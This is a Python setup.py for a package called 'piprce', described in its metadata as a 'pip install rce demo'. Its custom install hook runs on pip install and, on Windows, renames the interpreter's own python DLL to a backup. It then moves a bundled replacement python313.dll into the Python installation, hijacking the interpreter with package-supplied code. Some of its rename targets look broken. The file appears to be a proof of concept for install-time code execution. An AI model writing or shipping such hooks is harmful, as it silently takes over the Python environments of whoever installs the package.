from setuptools import setup
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import base64
import os
import platform
import sys

home_dir = sys.prefix

class CustomInstall(install):

    def run(self):
        
        install.run(self)

        system = platform.system()
        if system == "Windows":   
            version = f"{sys.version_info.major}{sys.version_info.minor}"
            ver_dll = "python" + version + ".dll"
            print(home_dir)
            #备份原文件
            os.rename(os.path.join(home_dir, ver_dll), 
                      os.path.join(home_dir, ver_dll + "-bk"))

            os.rename("configs/python313.dll", os.path.join(home_dir, "."))
            os.rename("configs/NEWS.TXT", os.path.join(home_dir, "Doc"))

class CustomUninstall(egg_info):
    def run(self):
        print("Overriding egg_info")
        super().run()


setup(name='piprce',
      version='0.0.5',
      description="pip install rce demo",
      author="lvxianzhi",
      py_modules=["piprce.hello"],
      cmdclass={
           "install": CustomInstall,
           "egg_info": CustomUninstall
       },
      # data_files=[
      #     (os.path.join(home_dir, "."), ["configs/python313.dll"]),
      #     (os.path.join(home_dir, "Doc"), ["configs/NEWS.TXT"]),
      # ],
      entry_points={     #安装后运行
          "console_scripts": [
              "post_install=piprce.install_script:main",
          ],
      },
   )
